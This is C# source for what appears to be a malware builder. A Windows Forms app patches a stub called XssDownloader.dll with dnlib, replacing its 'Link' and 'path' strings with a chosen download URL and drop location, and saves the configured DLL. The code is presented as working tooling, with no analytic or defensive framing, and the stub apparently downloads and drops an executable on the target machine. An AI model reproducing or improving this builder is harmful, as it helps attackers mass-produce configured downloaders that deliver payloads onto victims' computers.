using dnlib.DotNet;
using dnlib.DotNet.Emit;
using System;
using System.IO;
using System.Linq;
using System.Windows.Forms;

namespace Builder
{
    public partial class Builder : Form
    {
        private string stub;
        private string outpath;

        public Builder()
        {
            InitializeComponent();

            
            stub = System.IO.Path.Combine(Application.StartupPath, "net8.0", "XssDownloader.dll");
            outpath = stub; 

            Link.Text = "https://example.com/download.exe";
            Path.Text = "C:\\File.exe";
        }

        private void Build_Click(object sender, EventArgs e)
        {
            try
            {
                string newLink = Link.Text;
                string newPath = Path.Text;

                if (string.IsNullOrWhiteSpace(newLink) || string.IsNullOrWhiteSpace(newPath))
                {
                    MessageBox.Show("Please fill in all fields.", "Warning",
                                    MessageBoxButtons.OK, MessageBoxIcon.Warning);
                    return;
                }

                if (!File.Exists(stub))
                {
                    MessageBox.Show($"File not found:\n{stub}", "Error",
                                    MessageBoxButtons.OK, MessageBoxIcon.Error);
                    return;
                }

               
                string tempPath = stub + ".tmp";

                using (ModuleDefMD module = ModuleDefMD.Load(stub))
                {
                    foreach (var type in module.Types)
                    {
                        foreach (var method in type.Methods.Where(m => m.HasBody))
                        {
                            foreach (var instr in method.Body.Instructions)
                            {
                                if (instr.OpCode == OpCodes.Ldstr && instr.Operand is string s)
                                {
                                    if (s == "Link")
                                        instr.Operand = newLink;
                                    if (s == "path")
                                        instr.Operand = newPath;
                                }
                            }
                        }
                    }

                    var writerOptions = new dnlib.DotNet.Writer.ModuleWriterOptions(module);
                    writerOptions.Logger = DummyLogger.NoThrowInstance;

                   
                    module.Write(tempPath, writerOptions);
                }

               
                File.Delete(stub);
                File.Move(tempPath, stub);

                MessageBox.Show($"DLL modified successfully:\n\n{stub}", "Success",
                                MessageBoxButtons.OK, MessageBoxIcon.Information);

                System.Diagnostics.Process.Start("explorer.exe", $"/select,\"{stub}\"");
            }
            catch (UnauthorizedAccessException ex)
            {
                MessageBox.Show($"Access denied. Try running the application as administrator.\n\n{ex.Message}",
                                "Permission error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            catch (IOException ex)
            {
                MessageBox.Show($"I/O error:\n{ex.Message}\n\nMake sure the file is not in use.",
                                "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error modifying DLL:\n\n{ex.Message}\n\nType: {ex.GetType().Name}",
                                "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void Github_Click(object sender, EventArgs e)
        {
            try
            {
                System.Diagnostics.Process.Start(new System.Diagnostics.ProcessStartInfo("https://github.com/")
                {
                    UseShellExecute = true
                });
            }
            catch { }
        }
    }
}